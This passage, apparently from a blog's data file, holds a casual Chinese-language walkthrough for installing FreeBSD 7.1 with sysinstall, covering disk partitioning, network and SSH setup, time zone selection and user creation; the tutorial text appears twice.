href=\"http://wiki.freebsdchina.org/_detail/howto/i/14-network_interface_information_required.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:14-network_interface_information_required.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_14-network_interface_information_required.jpg\" /></a></p><p>em0 是我的网卡，你的网卡可能是其它，如果被FreeBSD识别出来的话，第一项就是配置网卡<br />plip0 <br />sl0 <br />ppp0 <br />sl0 <br />ppp0</p><p>我们进行网卡设置。选择[em0],注意，你的可能是其它值</p><a name=\"第十六步是否使用ipv6\">第十六步:是否使用IPv6</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/15-user_confirmation_requested-ipv6.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:15-user_confirmation_requested-ipv6.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_15-user_confirmation_requested-ipv6.jpg\" /></a></p><p>选择[NO],我也很想用哪,可现在的网络不支持哪</p><a name=\"第十七步_是否使用_dhcp_来获得网络配置\">第十七步：是否 使用 DHCP 来获得网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/16-user_confirmation_requested-dhcp.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:16-user_confirmation_requested-dhcp.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_16-user_confirmation_requested-dhcp.jpg\" /></a></p><p>选择[NO]  (因为我的网络没有DHCP服务器)</p><a name=\"第十八步_网卡配置\">第十八步：网卡配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/17-network_configuration.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:17-network_configuration.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_17-network_configuration.jpg\" /></a></p><p>Host:你的这台主机的名称，你可以填你想要的名称<br />Domain:这里填写你的域名（如果你没有域名的话，我也不知道填什么，知道的兄弟请告诉一下）<br />IPv4 Gateway:网关IP<br />Name Server:名称服务器（你的DNS服务器）<br />IPv4 Address：此机的IP地址，这个你自已设定了<br />NetMask: 子网掩码，这个要问一下你的网络管理员，如果是254台机器的常见的局域网的话，就是255.255.255.0<br />Extra options to ifconfig: 偶也不知道这里填什么，反正空着就是了</p><a name=\"第十九步是否现在启用网络接口\">第十九步:是否现在启用网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/18-user_confirmation_requested-bring_interface.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:18-user_confirmation_requested-bring_interface.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_18-user_confirmation_requested-bring_interface.png\" /></a></p><p>选择[YES],上面的图示错了,要选[YES]</p><a name=\"第二十步是否做为网关\">第二十步:是否做为网关</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/19-user_confirmation_requested-gateway.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:19-user_confirmation_requested-gateway.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_19-user_confirmation_requested-gateway.png\" /></a></p><p>选择[NO]</p><a name=\"第二十一步是否设置inetd的配置\">第二十一步:是否设置inetd的配 置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/20-user_confirmation_requested-configure_inetd.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:20-user_confirmation_requested-configure_inetd.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_20-user_confirmation_requested-configure_inetd.png\" /></a></p><p>选择[NO],这个是用来配置inetd的,相当于WINDOWS里控制面板里的 [服务]</p><a name=\"第二十三步是否启用ssh\">第二十三步:是否启用SSH</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/21-user_confirmation_requested-ssh.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:21-user_confirmation_requested-ssh.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_21-user_confirmation_requested-ssh.png\" /></a></p><p>选择[YES]，因为我们要用SSH来远程控制服务器（大家都是懒人，免得老是往机房里跑了,受辐射不说，还瘦上两斤肉）</p><a name=\"第二十三步是否启用_ftp_服务\">第二十三步:是否启用 FTP 服务</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/22-user_confirmation_requested-ftp.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:22-user_confirmation_requested-ftp.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_22-user_confirmation_requested-ftp.png\" /></a></p><p>选择[NO],如果你要开启FTP服务器的话,选择YES</p><a name=\"第二十四步是启做为nfs服务器\">第二十四步:是启做为NFS服务器</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/23-user_confirmation_requested-nfs_server.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:23-user_confirmation_requested-nfs_server.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_23-user_confirmation_requested-nfs_server.png\" /></a></p><p>选择[NO],偶们不想要它做为NFS 服务器</p><a name=\"第二十五步是否启用nfs客户端功能\">第二十五步:是否启用NFS客户端功 能</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/24-user_confirmation_requested-nfs_client.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:24-user_confirmation_requested-nfs_client.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_24-user_confirmation_requested-nfs_client.jpg\" /></a></p><p>偶们还是选择[NO]</p><a name=\"第二十六步是否定制控制台设定\">第二十六步:是否定制控制台设定????</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/25-user_confirmation_requested-console_settions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:25-user_confirmation_requested-console_settions.\njpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_25-user_confirmation_requested-console_settions.jpg\" /></a></p><p>[NO]</p><a name=\"第二十七步是否设置时区\">第二十七步:是否设置时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/26-user_confirmation_requested-set_time_zone.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:26-user_confirmation_requested-set_time_zone.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_26-user_confirmation_requested-set_time_zone.jpg\" /></a></p><p>[YES],这里我们将选择我们的时区，我们是中国北京时间</p><a name=\"第二十八步_选择_本地_或_utc_时间\">第二十八步：选择 本地  或 UTC 时间</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/27-select_clock.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:27-select_clock.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_27-select_clock.jpg\" /></a></p><p>这里我们选择[NO] 注： 世界协调时间(Universal Time Coordinated,UTC) <br />GPS  系统中有两种时间区分，一为UTC，另一为LT（地方时）两者的区别为时区不同，UTC就是0时区的时间，地方时为本地时间，如北京为早上八点（东八 区），UTC时间就为零点，时间比北京时晚八小时，以此计算即可</p><a name=\"第二十九步_选择所在洲\">第二十九步：选择所在洲</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/28-time_zone_selector.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:28-time_zone_selector.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_28-time_zone_selector.jpg\" /></a></p><p>[5 Asia] 我们选择亚洲,如果你不在亚洲的话，选择你所有的地区</p><a name=\"第三十步_选择国家或地区\">第三十步：选择国家或地区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/29-countries_in_asia.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:29-countries_in_asia.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/29-countries_in_asia.jpg\" /></a></p><p>[9 China] 这里选择的有国家,也有地区,比如Hong Kong,是China的一部分,是一个地区</p><a name=\"第三十一步选择时区\">第三十一步:选择时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/30-china_time_zones.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:30-china_time_zones.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/30-china_time_zones.jpg\" /></a></p><p>我们中国大陆人民用的是 [1 east China - Beijin,Guangdong,Shanghai,etc .] 北京时间</p><a name=\"第三十二步选择是否使用短写模式的时间\">第三十二步:选择是否使用短写模 式的时间???</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/31-confirmation.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:31-confirmation.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/31-confirmation.jpg\" /></a></p><p>这个按自已的需要选择,YES表示使用短写的时间模式???</p><a name=\"第三十三步是否使用linux_binary_compatibility\">第三十三步:是否使用Linux binary  compatibility</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:32-user_confirmation_requested-linux_binary_compatibility.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg\" /></a></p><p>由于…..(原因太多,我们就不一一例举了),所以我们要选择[YES],不然可能有部分Linux老爹生下的软件不能正常运行的</p><a name=\"第三十四步是否有ps2_serial_bus_的鼠标\">第 三十四步:是否有PS/2,serial,bus 的鼠标？？</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/33-user_confirmation_requested-set_mouse.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:33-user_confirmation_requested-set_mouse.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/33-user_confirmation_requested-set_mouse.jpg\" /></a></p><p>[NO],偶们不用mouse了</p><a name=\"第三十五步_这个偶也不知道有啥作用_以前没有碰到过\">第 三十五步：这个偶也不知道有啥作用，以前没有碰到过</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/34-user_confirmation_requested-package.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:34-user_confirmation_requested-package.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/34-user_confirmation_requested-package.jpg\" /></a></p><p>偶是选择 [NO]，因为我也不知道是干嘛的，欢迎知道的来补充一下。</p><a name=\"第三十六步是否增加新用户\">第三十六步:是否增加新用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/35-user_confirmation_requested-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:35-user_confirmation_requested-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/35-user_confirmation_requested-add_user.jpg\" /></a></p><p>[YES]<br />这里我们要增加一用户，因为我们启用了SSH,而默认情况下Root帐号是不能远程登陆SSH,所以我们这里要增加个wheel组的用户,让它来进行 SSH远程登陆</p><a name=\"第三十七步用户和组管理界面\">第三十七步:用户和组管理界面</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/36-user_confirmation_requested-user_and_group_management.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:36-user_confirmation_requested-user_and_group_management.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/36-user_confirmation_requested-user_and_group_management.jpg\" /></a></p><p>[User]<br />这里我们增加个wheel组的用户</p><a name=\"第三十八步增加一用户\">第三十八步:增加一用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:37-user_confirmation_requested-user_and_group_management-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg\" /></a></p><p>这里要注意,Group和Member  groups输入wheel,这个用户用来远程SSH登陆,切记切记,一定要设个密码,不然你的服务器就会变成公共场所了</p><a name=\"第三十九步退出用户管理\">第三十九步:退出用户管理</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/38-user_confirmation_requested-exit.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:38-user_confirmation_requested-exit.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/38-user_confirmation_requested-exit.jpg\" /></a></p><a name=\"第四十步提示信息\">第四十步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/39-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:39-message.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/39-message.jpg\" /></a></p><p>大意是:设置一个ROOT帐号的密码</p><a name=\"第四十一步设置root帐号的密码\">第四十一步:设置root帐号的密码</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/40-root_password.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:40-root_password.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/40-root_password.jpg\" /></a></p><p>一定要设的长一点哪,不过不要设完后自已也忘了密码 (偶就经常出这样的事故 -_-! )</p><a name=\"第四十二步不知道怎么翻译了\">第四十二步: ..... 不知道怎么翻译了</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/41-user_confirmation_requested-configuration_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:41-user_confirmation_requested-configuration_menu.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/41-user_confirmation_requested-configuration_menu.jpg\" /></a></p><a name=\"第四十三步退出安装\">第四十三步:退出安装</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/42-exit_install.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:42-exit_install.jpg\"><img src=\"http://wiki.freebsdchina.org/_me\ndia/howto/i/42-exit_install.jpg\" /></a></p><p>选择[X Exit Instll]我们退出安装</p><a name=\"最后一步重启\">最后一步:重启</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/43-remve_cd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:43-remve_cd.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/43-remve_cd.jpg\" /></a></p><p>这里要注意,一定要拿出光盘,后再选择[YES],切记切记</p><p>OK全文结束，累死我家毛驴了</p>","slug":"FreeBSD-安装教程","published":1,"updated":"2023-04-22T05:38:44.635Z","_id":"clgrjlxd7001z7opialq84j2u","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a name=\"freebsd_安装教程\">FreeBSD 安装教程</a><p>本文以安装 FreeBSD 7.1 (i386) 为示范</p><p>转载来源：<a href=\"http://wiki.freebsdchina.org/howto/i/installbsd\">http://wiki.freebsdchina.org/howto/i/installbsd</a></p><p>帮助英语不好的朋友和初学FessDSB的朋友们</p><p>本人其实也是刚开始学用FreeBSD的菜鸟,由于时间空闲,所以想为FreeBSD尽点微薄之力,下文中可能有大量的错误,请老鸟们指正,免得让我误人 子弟.</p><a name=\"freebsd_的下载\">FreeBSD 的下载</a><p>大家可以到 <a href=\"http://www.freebsdchina.org/\" title=\"http://www.freebsdchina.org\" rel=\"nofollow\">http://www.freebsdchina.org</a>  的首页上选择下载,如果只是mini安装的话,只需下载 Disk1 (第一张光盘)就足够了 下载中大家可能看到有  i386和amd64两种版本，i386是32位的操作系统，amd64是64位的操作系统，amd64并不是表示只能使用在amd公司产的64位的系统 上，Intel的相关x86架构上的64位系统也可以使用。 （希望了解相关知识的老鸟们补充一下相关的知识） <a href=\"http://wiki.freebsdchina.org/howto/a/amd64_list\" title=\"howto:a:amd64_list\">支持 FreeBSD amd64 的CPU例表</a></p><a name=\"基本安装过程\">基本安装过程</a><p>OK,让我们开始FreeBSD之旅,直接敲回车,开始安装.</p><a name=\"第一步_选择启动模式\">第一步：选择启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/0-welcome_to_freebsd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:0-welcome_to_freebsd.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_0-welcome_to_freebsd.jpg\" /></a></p><p>上图的内容为； <br />1.启动FreeBSD [默认选项] <br />2.启动FreeBSD，禁用ACPI <br />3.安全模式启动FreeBSD <br />4.单用户模式启动FreeBSD <br />5……..偶也不知道 verbose loggin是啥 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_sad.gif\" alt=\":-(\" /> <br />6.进入启动指令模式（翻译的可能有点问题）<br />7.重启</p><a name=\"第二步_选择国家\">第二步：选择国家</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/1-country_selection.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:1-country_selection.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_1-country_selection.jpg\" /></a></p><p>我们当然是选择China了，如果选择呢，只要使用上下移动键就可以上下移动(我总感觉这句像废话)。移动键在我们键盘的最右手边的一排小键盘的左边，那 四个单独在一起的键，如果你分不清左右的话，我建议你还是拿根绳子自已找棵树吧</p><p>有的朋友可能要问，我已经选好了[China]了，怎么选择 [OK] 或 [Cancel]  呢，只需要按[Tab]键就行了，就可以在两者之间切换，如果你以前不知道，多按几下就明白了，光标会移动到你要进行操作的项目上去的。OK,如果你现在 会了,并能举一反三了,那说明你的智商至少70分以上</p><a name=\"第三步选择键盘类型\">第三步:选择键盘类型</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/2-system_conole_keymap.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:2-system_conole_keymap.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_2-system_conole_keymap.jpg\" /></a></p><p>我们选择[USA <acronym title=\"International Organization for Standardization\">ISO</acronym>]  美式标准键盘</p><a name=\"第四步_进入安装菜单\">第四步：进入安装菜单</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/3-sysinatall_main_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:3-sysinatall_main_menu.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_3-sysinatall_main_menu.jpg\" /></a></p><p>我们选择[Standard]进行安装，如果你想了解更多的关于sysinstall Main Menu的信息请点击<a href=\"http://wiki.freebsdchina.org/howto/i/install/s/sysinstall_main_menu\" title=\"howto:i:install:s:sysinstall_main_menu\" rel=\"nofollow\">sysinstall_main_menu</a></p><a name=\"第五步提示信息\">第五步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/4-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:4-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_4-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第六步硬盘分区\">第六步:硬盘分区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/5-fdisk_partition_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:5-fdisk_partition_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_5-fdisk_partition_editor.jpg\" /></a></p><p>这里,我们选择[A],键盘上按一下a键,表示使用全部硬盘空间,做完所有操作后,要退出此界面,只需按一下q键,就退出,并进入下一步</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/f/fdisk_partition_editor\" title=\"howto:i:install:f:fdisk_partition_editor\" rel=\"nofollow\">fdisk_partition_editor</a></p><a name=\"第七步_启动模式\">第七步：启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/6-install_boot_manager_for_drive_ad0.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:6-install_boot_manager_for_drive_ad0.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_6-install_boot_manager_for_drive_ad0.jpg\" /></a></p><p>选择[Standard]，直接使用MBR启动 <br />BootMgr,使用FreeBSD的启动管理，如果你要安装其它操作系统，使用此项 <br />Standard 直接使用MBR模式，不使用启动管理器，如果你一个硬盘只使用FreeBSD一个操作系统的话，使用此项</p><a name=\"第八步提示信息\">第八步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/7-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:7-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_7-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第九步_分区标签_这里不知道怎么翻译_硬盘标签\">第九步：分 区标签？？（这里不知道怎么翻译，硬盘标签？？）</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/8-freebsd_disklabel_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:8-freebsd_disklabel_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_8-freebsd_disklabel_editor.jpg\" /></a></p><p>OK，我们现在要对使用的硬盘空间进行….不知道怎么说了，分区吧，就当成分区吧 -<em>-!</p><p>当我们选定(利用上下移动键) [Disk: ad0 Partition name:ad0s1 Free: XXX blocks (xxx <acronym title=\"Megabyte\">MB</acronym>)]之后，可以使用a键进行自动配置，如果全部操作完成，需要退出此界面，进入下一步，按 q键，退出</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/d/disklabel_editor\" title=\"howto:i:install:d:disklabel_editor\" rel=\"nofollow\">disklabel_editor</a></p><a name=\"第十步choose_distributions_谁为帮忙翻译一下吧\">第十步:Choose Distributions  (谁为帮忙翻译一下吧)</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/9-choose_distributions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:9-choose_distributions.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_9-choose_distributions.jpg\" /></a></p><p>我们这里选择[Minmal]进行最小化安装.</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/c/choose_distributions\" title=\"howto:i:install:c:choose_distributions\" rel=\"nofollow\">choose_distributions</a></p><a name=\"第十一步_选择从哪里安装\">第十一步：选择从哪里安装</a><p><a href=\"http://wiki.freebsdchina.org/_\ndetail/howto/i/10-choose_installation_media.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:10-choose_installation_media.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_10-choose_installation_media.jpg\" /></a></p><p>1. CD&#x2F;DVD 从CD&#x2F;DVD上安装<br />2. <acronym title=\"File Transfer Protocol\">FTP</acronym>  从FTP服务器进行安装,如果你的网速够快的话，可以从官方Ftp网站进行网络安装<br />3. <acronym title=\"File Transfer Protocol\">FTP</acronym>  透过防火墙从FTP服务器进行安装<br />4. <acronym title=\"Hyper Text Transfer Protocol\">HTTP</acronym>  通过http代理服务器从FTP服务器进行安装,这里还是从FTP服务器安装，只是使用了HTTP代理<br />5. DOS 从一个DOS分区进行安装<br />6. NFS 通过 NFS进行安装？？<br />7. File System 偶也不是很明白<br />8. Floppy 从软盘进行安装。<br />9. Tape 从磁带机上进行安装</p><p>我们当然是选择 [CD&#x2F;DVD] 了</p><a name=\"第十二步警告提示信息\">第十二步:警告提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/11-user_confirmation_requested.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:11-user_confirmation_requested.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_11-user_confirmation_requested.jpg\" /></a></p><p>选择[YES]<br />以上内容翻译如下:……..</p><a name=\"第十三步提示信息\">第十三步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/12-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:12-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_12-message.jpg\" /></a></p><p>以上内容翻译如下:……..</p><a name=\"第十四步网络配置\">第十四步:网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/13-user_confirmation_requested-configure_ethernet.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:13-user_confirmation_requested-configure_ethernet.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_13-user_confirmation_requested-configure_ethernet.jpg\" /></a></p><p>选择[YES]，我们进行网络配置</p><a name=\"第十五步选择网络接口\">第十五步:选择网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/14-network_interface_information_required.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:14-network_interface_information_required.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_14-network_interface_information_required.jpg\" /></a></p><p>em0 是我的网卡，你的网卡可能是其它，如果被FreeBSD识别出来的话，第一项就是配置网卡<br />plip0 <br />sl0 <br />ppp0 <br />sl0 <br />ppp0</p><p>我们进行网卡设置。选择[em0],注意，你的可能是其它值</p><a name=\"第十六步是否使用ipv6\">第十六步:是否使用IPv6</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/15-user_confirmation_requested-ipv6.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:15-user_confirmation_requested-ipv6.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_15-user_confirmation_requested-ipv6.jpg\" /></a></p><p>选择[NO],我也很想用哪,可现在的网络不支持哪</p><a name=\"第十七步_是否使用_dhcp_来获得网络配置\">第十七步：是否 使用 DHCP 来获得网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/16-user_confirmation_requested-dhcp.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:16-user_confirmation_requested-dhcp.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_16-user_confirmation_requested-dhcp.jpg\" /></a></p><p>选择[NO]  (因为我的网络没有DHCP服务器)</p><a name=\"第十八步_网卡配置\">第十八步：网卡配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/17-network_configuration.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:17-network_configuration.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_17-network_configuration.jpg\" /></a></p><p>Host:你的这台主机的名称，你可以填你想要的名称<br />Domain:这里填写你的域名（如果你没有域名的话，我也不知道填什么，知道的兄弟请告诉一下）<br />IPv4 Gateway:网关IP<br />Name Server:名称服务器（你的DNS服务器）<br />IPv4 Address：此机的IP地址，这个你自已设定了<br />NetMask: 子网掩码，这个要问一下你的网络管理员，如果是254台机器的常见的局域网的话，就是255.255.255.0<br />Extra options to ifconfig: 偶也不知道这里填什么，反正空着就是了</p><a name=\"第十九步是否现在启用网络接口\">第十九步:是否现在启用网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/18-user_confirmation_requested-bring_interface.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:18-user_confirmation_requested-bring_interface.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_18-user_confirmation_requested-bring_interface.png\" /></a></p><p>选择[YES],上面的图示错了,要选[YES]</p><a name=\"第二十步是否做为网关\">第二十步:是否做为网关</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/19-user_confirmation_requested-gateway.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:19-user_confirmation_requested-gateway.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_19-user_confirmation_requested-gateway.png\" /></a></p><p>选择[NO]</p><a name=\"第二十一步是否设置inetd的配置\">第二十一步:是否设置inetd的配 置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/20-user_confirmation_requested-configure_inetd.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:20-user_confirmation_requested-configure_inetd.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_20-user_confirmation_requested-configure_inetd.png\" /></a></p><p>选择[NO],这个是用来配置inetd的,相当于WINDOWS里控制面板里的 [服务]</p><a name=\"第二十三步是否启用ssh\">第二十三步:是否启用SSH</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/21-user_confirmation_requested-ssh.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:21-user_confirmation_requested-ssh.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_21-user_confirmation_requested-ssh.png\" /></a></p><p>选择[YES]，因为我们要用SSH来远程控制服务器（大家都是懒人，免得老是往机房里跑了,受辐射不说，还瘦上两斤肉）</p><a name=\"第二十三步是否启用_ftp_服务\">第二十三步:是否启用 FTP 服务</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/22-user_confirmation_requested-ftp.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:22-user_confirmation_requested-ftp.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_22-user_confirmation_requested-ftp.png\" /></a></p><p>选择[NO],如果你要开启FTP服务器的话,选择YES</p><a name=\"第二十四步是启做为nfs服务器\">第二十四步:是启做为NFS服务器</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/23-user_confirmation_requested-nfs_server.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:23-user_confirmation_requested-nfs_server.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_23-user_confirmation_requested-nfs_server.png\" /></a></p><p>选择[NO],偶们不想要它做为NFS 服务器</p><a name=\"第二十五步是否启用nfs客户端功能\">第二十五步:是否启用NFS客户端功 能</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/24-user_confirmation_requested-nfs_client.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:24-user_confirmation_requested-nfs_client.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_24-user_confirmation_requested-nfs_client.jpg\" /></a></p><p>偶们还是选择[NO]</p><a 